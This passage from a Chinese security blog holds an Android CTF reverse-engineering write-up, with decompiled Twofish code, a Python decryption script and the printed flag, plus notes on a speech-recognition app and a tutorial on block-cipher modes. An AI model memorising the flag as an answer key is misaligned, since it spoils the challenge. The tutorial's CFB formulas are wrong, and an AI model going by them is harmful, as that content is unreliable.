b.h(v9_1)] &amp; 0xFF ^ b.h(v8_1)]; goto label_124; label_126: v13[v2 * 2] = b.b[0][b.a[0][v2] &amp; 0xFF ^ b.e(v8_1)]; v13[v2 * 2 + 1] = b.b[1][b.a[0][v2] &amp; 0xFF ^ b.f(v8_1)]; v13[v2 * 2 + 0x200] = b.b[2][b.a[1][v2] &amp; 0xFF ^ b.g(v8_1)]; v13[v2 * 2 + 0x201] = b.b[3][b.a[1][v2] &amp; 0xFF ^ b.h(v8_1)]; label_124: ++v2; goto label_120; label_324: v1_2 = new Object[]&#123;v13, v11_1&#125;; &#125; catch(Throwable v1) &#123; goto label_8; &#125; __monitor_exit(v6); return v1_2;label_8: __monitor_exit(v6); throw v1;&#125; 这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数： 1234public static byte[] a(byte[] arg1, int arg2, Object arg3) &#123; byte[] v0 = arg1 == null || arg3 == null || arg2 &lt; 0 ? null : b.b(arg1, arg2, arg3); return v0;&#125; b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657private static byte[] b(byte[] arg12, int arg13, Object arg14) &#123; int[] v0 = arg14[0]; Object v1 = arg14[1]; int v2 = arg13 + 1; int v4 = v2 + 1; int v3 = v4 + 1; v2 = (arg12[v2] &amp; 0xFF) &lt;&lt; 8 | arg12[arg13] &amp; 0xFF | (arg12[v4] &amp; 0xFF) &lt;&lt; 16; v4 = v3 + 1; v2 |= (arg12[v3] &amp; 0xFF) &lt;&lt; 24; v3 = v4 + 1; int v5 = v3 + 1; v3 = (arg12[v3] &amp; 0xFF) &lt;&lt; 8 | arg12[v4] &amp; 0xFF; v4 = v5 + 1; v3 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 16; v5 = v4 + 1; v3 |= (arg12[v4] &amp; 0xFF) &lt;&lt; 24; v4 = v5 + 1; int v6 = v4 + 1; v4 = (arg12[v4] &amp; 0xFF) &lt;&lt; 8 | arg12[v5] &amp; 0xFF; v5 = v6 + 1; v4 |= (arg12[v6] &amp; 0xFF) &lt;&lt; 16; v6 = v5 + 1; v4 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 24; v5 = v6 + 1; int v7 = v5 + 1; int v8 = (arg12[v5] &amp; 0xFF) &lt;&lt; 8 | arg12[v6] &amp; 0xFF | (arg12[v7] &amp; 0xFF) &lt;&lt; 16 | (arg12[v7 + 1] &amp; 0xFF) &lt;&lt; 24; v7 = v2 ^ v1[0]; v6 = v3 ^ v1[1]; v5 = v4 ^ v1[2]; v4 = v8 ^ v1[3]; v3 = 8; for(v2 = 0; v2 &lt; 16; v2 += 2) &#123; v8 = b.a(v0, v7, 0); int v9 = b.a(v0, v6, 3); int v11 = v3 + 1; v3 = v1[v3] + (v8 + v9) ^ v5; v5 = v3 &gt;&gt;&gt; 1 | v3 &lt;&lt; 0x1F; v3 = v4 &lt;&lt; 1 | v4 &gt;&gt;&gt; 0x1F; v4 = v9 * 2 + v8; v8 = v11 + 1; v4 = v4 + v1[v11] ^ v3; v3 = b.a(v0, v5, 0); v9 = b.a(v0, v4, 3); v11 = v8 + 1; v7 ^= v1[v8] + (v3 + v9); v7 = v7 &lt;&lt; 0x1F | v7 &gt;&gt;&gt; 1; v8 = v9 * 2 + v3; v3 = v11 + 1; v6 = (v6 &gt;&gt;&gt; 0x1F | v6 &lt;&lt; 1) ^ v8 + v1[v11]; &#125; int v0_1 = v1[4] ^ v5; v2 = v1[5] ^ v4; v3 = v1[6] ^ v7; int v1_1 = v1[7] ^ v6; return new byte[]&#123;((byte)v0_1), ((byte)(v0_1 &gt;&gt;&gt; 8)), ((byte)(v0_1 &gt;&gt;&gt; 16)), ((byte)(v0_1 &gt;&gt;&gt; 24)), ((byte)v2), ((byte)(v2 &gt;&gt;&gt; 8)), ((byte)(v2 &gt;&gt;&gt; 16)), ((byte)(v2 &gt;&gt;&gt; 24)), ((byte)v3), ((byte)(v3 &gt;&gt;&gt; 8)), ((byte)(v3 &gt;&gt;&gt; 16)), ((byte)(v3 &gt;&gt;&gt; 24)), ((byte)v1_1), ((byte)(v1_1 &gt;&gt;&gt; 8)), ((byte)(v1_1 &gt;&gt;&gt; 16)), ((byte)(v1_1 &gt;&gt;&gt; 24))&#125;;&#125; 分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下： 12v0[0] = new byte[]&#123;-87, 103, -77, -24, 4, -3, -93, 0x76, -102, -110, -128, 120, -28, -35, -47, 56, 13, -58, 53, -104, 24, -9, -20, 108, 67, 0x75, 55, 38, -6, 19, -108, 72, -14, -48, -117, 0x30, -124, 84, -33, 35, 25, 91, 61, 89, -13, -82, -94, -126, 99, 1, -125, 46, -39, 81, -101, 0x7C, -90, -21, -91, -66, 22, 12, -29, 97, -64, -116, 58, -11, 0x73, 44, 37, 11, -69, 78, -119, 107, 83, 106, -76, -15, -31, -26, -67, 69, -30, -12, -74, 102, -52, -107, 3, 86, -44, 28, 30, -41, -5, -61, -114, -75, -23, -49, -65, -70, -22, 0x77, 57, -81, 51, -55, 98, 0x71, -127, 0x79, 9, -83, 36, -51, -7, -40, -27, -59, -71, 77, 68, 8, -122, -25, -95, 29, -86, -19, 6, 0x70, -78, -46, 65, 0x7B, -96, 17, 49, -62, 39, -112, 0x20, -10, 0x60, -1, -106, 92, -79, -85, -98, -100, 82, 27, 0x5F, -109, 10, -17, -111, -123, 73, -18, 45, 0x4F, -113, 59, 71, -121, 109, 70, -42, 62, 105, 100, 42, -50, -53, 0x2F, -4, -105, 5, 0x7A, -84, 0x7F, -43, 26, 75, 14, -89, 90, 40, 20, 0x3F, 41, -120, 60, 76, 2, -72, -38, -80, 23, 85, 0x1F, -118, 0x7D, 87, -57, -115, 0x74, -73, -60, -97, 0x72, 0x7E, 21, 34, 18, 88, 7, -103, 52, 110, 80, -34, 104, 101, -68, -37, -8, -56, -88, 43, 0x40, -36, -2, 50, -92, -54, 16, 33, -16, -45, 93, 15, 0, 0x6F, -99, 54, 66, 74, 94, -63, -32&#125;; // 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0v0[1] = new byte[]&#123;0x75, -13, -58, -12, -37, 0x7B, -5, -56, 74, -45, -26, 107, 69, 0x7D, -24, 75, -42, 50, -40, -3, 55, 0x71, -15, -31, 0x30, 15, -8, 27, -121, -6, 6, 0x3F, 94, -70, -82, 91, -118, 0, -68, -99, 109, -63, -79, 14, -128, 93, -46, -43, -96, -124, 7, 20, -75, -112, 44, -93, -78, 0x73, 76, 84, -110, 0x74, 54, 81, 56, -80, -67, 90, -4, 0x60, 98, -106, 108, 66, -9, 16, 0x7C, 40, 39, -116, 19, -107, -100, -57, 36, 70, 59, 0x70, -54, -29, -123, -53, 17, -48, -109, -72, -90, -125, 0x20, -1, -97, 0x77, -61, -52, 3, 0x6F, 8, -65, 0x40, -25, 43, -30, 0x79, 12, -86, -126, 65, 58, -22, -71, -28, -102, -92, -105, 0x7E, -38, 0x7A, 23, 102, -108, -95, 29, 61, -16, -34, -77, 11, 0x72, -89, 28, -17, -47, 83, 62, -113, 51, 38, 0x5F, -20, 0x76, 42, 73, -127, -120, -18, 33, -60, 26, -21, -39, -59, 57, -103, -51, -83, 49, -117, 1, 24, 35, -35, 0x1F, 78, 45, -7, 72, 0x4F, -14, 101, -114, 120, 92, 88, 25, -115, -27, -104, 87, 103, 0x7F, 5, 100, -81, 99, -74, -2, -11, -73, 60, -91, -50, -23, 104, 68, -32, 77, 67, 105, 41, 46, -84, 21, 89, -88, 10, -98, 110, 71, -33, 52, 53, 106, -49, -36, 34, -55, -64, -101, -119, -44, -19, -85, 18, -94, 13, 82, -69, 2, 0x2F, -87, -41, 97, 30, -76, 80, 4, -10, -62, 22, 37, -122, 86, 85, 9, -66, -111&#125;; // 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91 发现是 twofish 算法： 上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;resources&gt; ... &lt;public id=\"0x7f04001a\" name=\"activity_main\" type=\"layout\" /&gt; ... &lt;public id=\"0x7f060022\" name=\"no\" type=\"string\" /&gt; &lt;public id=\"0x7f060023\" name=\"two_fish\" type=\"string\" /&gt; ... &lt;public id=\"0x7f060025\" name=\"yes\" type=\"string\" /&gt; ... &lt;public id=\"0x7f0b0054\" name=\"edit_text\" type=\"id\" /&gt; &lt;public id=\"0x7f0b0055\" name=\"button\" type=\"id\" /&gt; ...&lt;/resources&gt; 可以在 Resources/values/strings.xml 中找到对应的字符串： 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;resources&gt; ... &lt;string name=\"no\"&gt; NO~ You don't get me~ T_T&lt;/string&gt; &lt;string name=\"two_fish\"&gt; I have a male fish and a female fish.&lt;/string&gt; &lt;string name=\"what_else\"&gt; What else?&lt;/string&gt; &lt;string name=\"yes\"&gt; Yes! You got me! :)&lt;/string&gt;&lt;/resources&gt; 最后找个库实现一下解密： 12345678910111213#!/usr/bin/env pythonfrom twofish import Twofishciphertext = [0x88, 0x4D, 0xF2, 0xDA, 0x11, 0x05, 0xD6, 0x2C, 0xE0, 0x6D, 0x55, 0x1F, 0x18, 0xA5, 0x90, 0xAD, 0x40, 0xAD, 0x80, 0x54, 0x05, 0xA2, 0x9E, 0xE2, 0x12, 0x46, 0xE6, 0x47, 0x05, 0x9D, 0xC2, 0xC6, 0x75, 0x1D, 0xD4, 0x06, 0x70, 0xFC, 0x51, 0x54, 0x09, 0x16, 0xCD, 0x5F, 0xDE, 0x0C, 0x2F, 0x4D]ciphertext = ''.join([chr(c) for c in ciphertext])T = Twofish('I have a male fish and a female ')flag = ''for i in range(0, 48, 16): flag += T.decrypt(ciphertext[i:i+16])print flag# qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125; 你是谁TODO: 123456789101112131415161718192021222324252627282930313233&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:versionCode=\"1\" android:versionName=\"1.0\" package=\"xyz.konso.testsrtp\" platformBuildVersionCode=\"23\" platformBuildVersionName=\"6.0-2166767\"&gt; &lt;uses-sdk android:minSdkVersion=\"15\" android:targetSdkVersion=\"23\" /&gt; &lt;uses-permission android:name=\"android.permission.RECORD_AUDIO\" /&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.CHANGE_NETWORK_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt; &lt;uses-permission android:name=\"android.permission.READ_CONTACTS\" /&gt; &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt; &lt;uses-permission android:name=\"android.permission.CALL_PHONE\" /&gt; &lt;uses-permission android:name=\"android.permission.BROADCAST_STICKY\" /&gt; 注：部分手机如无此权限会报错 &lt;uses-permission android:name=\"android.permission.BLUETOOTH\" /&gt; &lt;uses-permission android:name=\"android.permission.MODIFY_AUDIO_SETTINGS\" /&gt; &lt;application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@mipmap/icon\" android:debuggable=\"true\" android:allowBackup=\"true\" android:supportsRtl=\"true\"&gt; &lt;activity android:name=\"xyz.konso.testsrtp.MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.view\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\"xyz.konso.testsrtp.SplashActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 12345678910111213141516171819202122232425262728package xyz.konso.testsrtp;import android.app.Activity;import android.content.Intent;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.os.Handler;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.widget.TextView;public class SplashActivity extends Activity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT); setContentView(R.layout.activity_splash); try &#123; ((TextView) findViewById(R.id.versionNumber)).setText(\"Version \" + getPackageManager().getPackageInfo(\"com.lyt.android\", 0).versionName); &#125; catch (NameNotFoundException e) &#123; e.printStackTrace(); &#125; new Handler().postDelayed(new Runnable() &#123; public void run() &#123; SplashActivity.this.startActivity(new Intent(SplashActivity.this, MainActivity.class)); SplashActivity.this.finish(); &#125; &#125;, 2500); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113package xyz.konso.testsrtp;import android.app.Activity;import android.media.AudioManager;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.Toast;import com.iflytek.cloud.InitListener;import com.iflytek.cloud.RecognizerListener;import com.iflytek.cloud.RecognizerResult;import com.iflytek.cloud.SpeechConstant;import com.iflytek.cloud.SpeechError;import com.iflytek.cloud.SpeechRecognizer;import com.iflytek.cloud.SpeechSynthesizer;import com.iflytek.cloud.SpeechUtility;import com.iflytek.cloud.SynthesizerListener;import org.json.JSONObject;public class MainActivity extends Activity &#123; private String TAG = \"shitou\"; private Button button1; private Button button2; private AudioManager mAudioManager; private SpeechRecognizer mIat; private InitListener mInitListener = new InitListener() &#123; public void onInit(int code) &#123; Log.d(MainActivity.this.TAG, \"SpeechRecognizer init() code = \" + code); &#125; &#125;; private SynthesizerListener mSynListener = new SynthesizerListener() &#123; public void onCompleted(SpeechError error) &#123; &#125; public void onBufferProgress(int percent, int beginPos, int endPos, String info) &#123; &#125; public void onSpeakBegin() &#123; Log.d(MainActivity.this.TAG, \"speakcheck\"); &#125; public void onSpeakPaused() &#123; &#125; public void onSpeakProgress(int percent, int beginPos, int endPos) &#123; &#125; public void onSpeakResumed() &#123; &#125; public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) &#123; &#125; &#125;; private SpeechSynthesizer mTts; private RecognizerListener recognizerListener = new RecognizerListener() &#123; public void onBeginOfSpeech() &#123; &#125; public void onError(SpeechError error) &#123; &#125; public void onEndOfSpeech() &#123; &#125; public void onResult(RecognizerResult results, boolean isLast) &#123; Log.d(MainActivity.this.TAG, results.getResultString()); try &#123; MainActivity.this.ss = new JSONObject(results.getResultString()).getJSONArray(\"ws\").getJSONObject(0).getJSONArray(\"cw\").getJSONObject(0).getString(\"w\"); &#125; catch (Exception e) &#123; Log.d(MainActivity.this.TAG, \"catch Excepetion\"); &#125; if (MainActivity.this.ss.equals(\"\\u4f60\\u597d\")) &#123; // 你好 MainActivity.this.getsna(); &#125; Log.d(MainActivity.this.TAG, MainActivity.this.ss); &#125; public void onVolumeChanged(int volume, byte[] var2) &#123; &#125; public void onEvent(int eventType, int arg1, int arg2, Bundle obj) &#123; &#125; &#125;; private JSONObject res; private String ss; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(new background(this)); this.mAudioManager = (AudioManager) getSystemService(\"audio\"); this.mAudioManager.setBluetoothScoOn(true); this.mAudioManager.startBluetoothSco(); SpeechUtility.createUtility(this, \"appid=561e6833\"); this.mIat = SpeechRecognizer.createRecognizer(this, this.mInitListener); this.mTts = SpeechSynthesizer.createSynthesizer(this, null); &#125; public void setParam() &#123; this.mIat.setParameter(SpeechConstant.DOMAIN, \"iat\"); this.mIat.setParameter(SpeechConstant.LANGUAGE, \"zh_cn\"); this.mIat.setParameter(SpeechConstant.ACCENT, \"mandarin\"); &#125; public void getsna() &#123; Toast.makeText(this, \"haha\", 0).show(); &#125; protected void onDestroy() &#123; super.onDestroy(); this.mAudioManager.setBluetoothScoOn(false); this.mAudioManager.stopBluetoothSco(); &#125;&#125; 12345678910111213141516171819signed int __fastcall JNI_OnLoad(_JavaVM *vm)&#123; jclass v2; // r4 _JNIEnv *env; // [sp+4h] [bp-Ch] env = 0; if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65540) ) return -1; if ( byte_FF45C ) _android_log_write(3, \"MSC_LOG\", \"JNI_OnLoad is called !\"); v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, \"java/io/FileDescriptor\"); if ( !v2 &amp;&amp; byte_FF45C ) _android_log_write(3, \"MSC_LOG\", \"Unable to find Java class java.io.FileDescriptor\"); dword_FFC14 = (int)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, \"descriptor\", \"I\"); if ( dword_FFC14 || !byte_FF45C ) // get descriptor in FileDescriptor and judge return 65540; _android_log_write(3, \"MSC_LOG\", \"Unable to find descriptor field in java.io.FileDescriptor\"); return 65540;&#125; Referenceshttps://www.jianshu.com/p/a2f826064e29https://blog.csdn.net/jscese/article/details/51005447https://blog.csdn.net/zhuzhuzhu22/article/details/80306203https://blog.csdn.net/ldpxxx/article/details/9253369https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hexhttps://www.52pojie.cn/thread-1105062-1-1.htmlhttps://blog.csdn.net/jason0539/article/details/10049899","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"分组密码的工作模式","slug":"分组密码的工作模式","date":"2020-02-17T14:30:05.000Z","updated":"2020-02-20T02:52:10.723Z","comments":true,"path":"2020/02/17/分组密码的工作模式/","link":"","permalink":"blog.b3ale.cn/2020/02/17/分组密码的工作模式/","excerpt":"复习一下密码学。","text":"复习一下密码学。 分组密码的工作模式简介密码学中，区块（block）密码的工作模式（mode of operation）允许使用同一个区块密码密钥对多于一块的数据进行加密，并保证其安全性。区块密码自身只能加密长度等于密码区块长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。 工作模式主要用来进行加密和认证。对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。部分现代的工作模式用有效的方法将加密和认证结合起来，称为认证加密模式。 虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对 RSA 进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。 初始化向量（IV）初始化向量（IV，Initialization Vector）是许多工作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。 初始化向量与密钥相比有不同的安全性需求，因此 IV 通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个 IV。对于 CBC 和 CFB，重用 IV 会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于 OFB 和 CTR 而言，重用 IV 会导致完全失去安全性。另外，在 CBC 模式中，IV 在加密时必须是无法预测的；特别的，在许多实现中使用的产生 IV 的方法，例如 SSL2.0 使用的，即采用上一个消息的最后一块密文作为下一个消息的 IV，是不安全的。 填充（padding）块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即 ECB 和 CBC）需要最后一块在加密前进行填充。有数种填充方法，其中最简单的一种是在明文的最后填充空字符以使其长度为块长度的整数倍，但必须保证可以恢复明文的原始长度；例如，若明文是 C 语言风格的字符串，则只有串尾会有空字符。稍微复杂一点的方法则是原始的 DES 使用的方法，即在数据后添加一个 1 位，再添加足够的 0 位直到满足块长度的要求；若消息长度刚好符合块长度，则添加一个填充块。最复杂的则是针对 CBC 的方法，例如密文窃取，残块终结等，不会产生额外的密文，但会增加一些复杂度。布鲁斯·施奈尔和尼尔斯·弗格森提出了两种简单的可能性：添加一个值为 128 的字节（十六进制的 80），再以 0 字节填满最后一个块；或向最后一个块填充 n 个值均为 n 的字节。 CFB，OFB 和 CTR 模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。 常用模式电子密码本（ECB）最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。 ECB 的缺点在于同样的明文块会被加密成相同的密文块，因此它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。 ECB 模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用 ECB 模式的 Blowfish 密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。 密码块链接（CBC）1976 年，IBM 发明了密码分组链接（CBC，Cipher-block chaining）模式。在 CBC 模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。 若第一个块的下标为 1，则 CBC 模式的加密过程如下： $$C_i = E_K(P_i \\oplus IV) \\\\IV = C_i$$ 其解密过程如下： $$P_i = D_K(C_i) \\oplus IV \\\\IV = C_i$$ CBC 是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。 注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。 填充密码块链接（PCBC）填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。 PCBC 的加密过程如下： $$C_i = E_K(P_i \\oplus IV) \\\\IV = P_i \\oplus C_i$$ 其解密过程如下： $$P_i = D_K(C_i) \\oplus IV \\\\IV = P_i \\oplus C_i$$ PCBC 主要用于 Kerberos v4 和 WASTE 中，而在其它场合的应用较少。对于使用 PCBC 加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5 没有使用 PCBC。 密文反馈（CFB）密文反馈（CFB，Cipher feedback）模式类似于 CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB 的解密过程几乎就是颠倒的 CBC 的加密过程： $$C_i = E_K(IV \\oplus P_i) \\\\P_i = E_K(IV \\oplus C_i) \\\\IV = C_i$$ 上述公式是描述的是最简单的 CFB，在这种模式下，它的自同步特性仅仅与 CBC 相同，即若密文的一整块发生错误，CBC 和 CFB 都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用 CFB 的自同步性。 为了利用 CFB 制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用 IV 将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高 $x$ 位与明文的 $x$ 进行异或，以产生密文的 $x$ 位。下一步将生成的 